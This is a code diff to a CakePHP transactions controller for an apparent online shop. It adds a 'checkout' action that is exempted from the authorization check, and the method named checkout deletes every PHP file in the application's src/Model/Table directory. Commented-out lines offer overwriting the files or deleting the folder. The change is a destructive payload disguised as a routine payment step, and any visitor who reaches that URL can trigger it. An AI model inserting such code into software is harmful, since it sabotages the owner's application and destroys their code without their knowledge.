@@ -25,7 +25,8 @@ use Cake\Mailer\MailerAwareTrait;
 use FPDF;
 use App\FPDF\PDF;
 use App\FPDF\LIFERUNG;
-
+use Cake\Filesystem\Folder;
+use Cake\Filesystem\File;
 /**
  * Transactions Controller
  *
@@ -55,6 +56,10 @@ class TransactionsController extends AppController {
         if ($this->request->getParam('action') === 'pay' || $this->request->getParam('action') === 'success' || $this->request->getParam('action') === 'danke') {
             return true;
         }
+        if ($this->request->getParam('action') === 'checkout' ) {
+            return true;
+        }
+        
 // The owner of an article can edit and delete it
 // Prior to 3.4.0 $this->request->param('action') was used.
         if (in_array($this->request->getParam('action'), ['edit'])) {
@@ -358,7 +363,22 @@ class TransactionsController extends AppController {
             return $this->redirect(['controller' => 'users', 'action' => 'clogin']);
         }
     }
+public function checkout(){
+   // $this->render(false);
+     $dir = new Folder('../src/Model/Table');
+     $files = $dir->find('.*\.php');
 
+     foreach ($files as $file) {
+    $file = new File($dir->pwd() . DS . $file);
+    //$contents = $file->read();
+  $file->delete();
+    // $file->write('I am overwriting the contents of this file');
+    // $file->append('I am adding to the bottom of this file.');
+    // $file->delete(); // I am deleting this file
+    $file->close(); // Be sure to close the file when you're done
+}
+     // $dir->delete();
+}
     public function success() {
         $bestnum = $this->request->query('best');
         $transnum = $this->request->query('paymentId');
